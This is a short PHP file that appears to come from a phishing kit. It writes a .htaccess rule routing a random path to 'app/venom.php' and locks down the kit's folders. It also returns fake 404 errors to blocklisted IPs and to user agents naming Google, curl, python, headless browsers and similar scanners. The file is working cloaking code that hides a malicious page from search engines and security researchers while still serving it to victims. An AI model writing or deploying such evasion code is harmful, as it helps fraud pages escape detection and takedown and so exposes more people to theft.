<?php
function rewrite_htaccess($randomString)
{
    $htaccess = 'RewriteEngine on
RewriteRule ^' . $randomString . '  app/venom.php
<Files .htaccess>
Order allow,deny
Deny from all
</Files>
RewriteRule ^app/?$ - [F,L]
RewriteRule ^lib/?$ - [F,L]';
    file_put_contents(__DIR__ . '/../.htaccess', $htaccess);
}

function isBlocked()
{
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $blocked = array('Java', 'python', 'headless', 'google', 'curl',  'x11', 'dalvik', 'scrapper', 'messages', 'KOT49H', 'KOT49H', 'Safari/9537.53');

    if (strlen($useragent) < 15)
        return TRUE;

    foreach ($blocked as $string) {

        if (stristr($useragent, $string))
            return TRUE;
    }
    return FALSE;
}
$allbad = file_get_contents(__DIR__ . '/blocklist.txt');

$ex = explode(PHP_EOL, $allbad);

foreach ($ex as $current) {
    if ($_SERVER['REMOTE_ADDR'] == rtrim($current)) {
        echo "OK";
        die(header('HTTP/1.0 404 Not Found'));
    }
}

if (isBlocked()) {
    die(header('HTTP/1.0 404 Not Found'));
}
